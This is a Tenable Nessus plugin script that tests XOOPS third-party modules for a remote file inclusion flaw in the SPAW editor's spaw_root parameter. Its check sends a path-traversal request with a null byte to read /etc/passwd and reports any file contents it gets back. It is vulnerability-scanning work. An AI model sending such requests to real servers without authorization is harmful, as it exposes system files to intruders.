#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25372);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-3057", "CVE-2007-3220", "CVE-2007-3221", "CVE-2007-3237", "CVE-2007-3289");
  script_bugtraq_id(24302, 24470);
  script_xref(name:"OSVDB", value:"35381");
  script_xref(name:"OSVDB", value:"35383");
  script_xref(name:"OSVDB", value:"36306");
  script_xref(name:"OSVDB", value:"36307");
  script_xref(name:"OSVDB", value:"38473");

  script_name(english:"XOOPS Multiple Modules spaw_control.class.php spaw_root Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with spaw_control.class.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a third-party module for XOOPS. 

The version of at least one such module installed on the remote host
includes a copy of the SPAW PHP WYSIWYG editor control that fails to
sanitize user-supplied input to the 'spaw_root' parameter of the
'spaw_control.class.php' script before using it to include PHP code. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit this issue to view arbitrary
files on the remote host or possibly to execute arbitrary PHP code,
perhaps from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4022" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4063" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4069" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4070" );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4084" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or contact the product's
author to see if an upgrade exists." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Vulnerable modules
nmods = 0;
mod = make_array();
# -   Cjay Content 3
mod[nmods++] = "cjaycontent/admin/editor2";
# -   iContent
mod[nmods++] = "icontent/include/wysiwyg";
# -   TinyContent
mod[nmods++] = "tinycontent/admin/spaw";
# -   WiwiMod
mod[nmods++] = "wiwimod/spaw";
# -   XT-Conteudo
mod[nmods++] = "xt_conteudo/admin/spaw";


info = "";
contents = "";


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  for (i=0; i<nmods; i++)
  {
    u = string(
        dir, "/modules/", mod[i], "/spaw_control.class.php?",
        "spaw_root=", file, "%00"
      );
    r = http_send_recv3(port:port, method: "GET", item: u);
    if (isnull(r)) exit(0);

    # There's a problem if...
    if (
      (
        # there's an entry for root or...
        egrep(pattern:"root:.*:0:[01]:", string:r[2]) ||
        # we get an error saying "failed to open stream" or...
        string("main(", file, "\\0config/spaw_control.config.php): failed to open stream") >< r[2] ||
        # we get an error claiming the file doesn't exist or...
        string("main(", file, "): failed to open stream: No such file") >< r[2] ||
        # we get an error about open_basedir restriction.
        string("open_basedir restriction in effect. File(", file) >< r[2]
      )
    )
    {
      info = info +
             "  " + dir + "/modules/" + mod[i] + "/spaw_control.class.php" + '\n';

      if (!contents && egrep(string:r[2], pattern:"root:.*:0:[01]:"))
        contents = r[2];

      if (!thorough_tests) break;
    }
  }
}

if (info)
{
  if (contents)
    info = string(
    "The following scripts(s) are vulnerable :\n",
    "\n",
      info,
      "\n",
      "And here are the (repeated) contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );

  security_hole(port:port, extra: info);
}
